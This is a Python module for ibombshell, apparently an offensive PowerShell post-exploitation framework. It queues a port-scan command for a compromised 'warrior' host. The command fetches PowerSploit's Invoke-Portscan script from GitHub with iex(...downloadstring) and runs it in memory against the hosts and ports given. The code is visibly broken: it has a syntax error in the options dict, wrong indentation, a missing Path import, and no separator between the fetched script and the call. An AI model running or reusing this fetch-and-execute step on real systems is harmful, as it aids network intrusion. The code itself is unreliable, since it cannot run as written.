from module import Module


class CustomModule(Module):
    def __init__(self):

        information = {"Name": "Portscan",
                       "Description": "Portscan for ibombshell",
                       "Author": "Rich Lundeen",
                       "Link": "https://github.com/PowerShellMafia/PowerSploit",
                       "License": "BSD 3-Clause",
                       "Module": "@pablogonzalezpe, @toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [, "Warrior in war", True],
                   "hosts": ["127.0.0.1", "Hosts to scan", True],
                   "port": ["20-500", "Ports to scan", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        warrior_exist = False
            for p in Path("/tmp/").glob("ibs-*"):
                if str(p)[9:] == self.args["warrior"]:
                    warrior_exist = True
                    break

            if warrior_exist:
                function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')"
                function += 'Invoke-Portscan -Hosts {} -ports {}'.format(self.args["hosts"], self.args["port"])

                with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                    f.write(function)

                cprint ('[+] Done!', 'green')

            else:
                cprint ('[!] Failed... Warrior don´t found', 'red')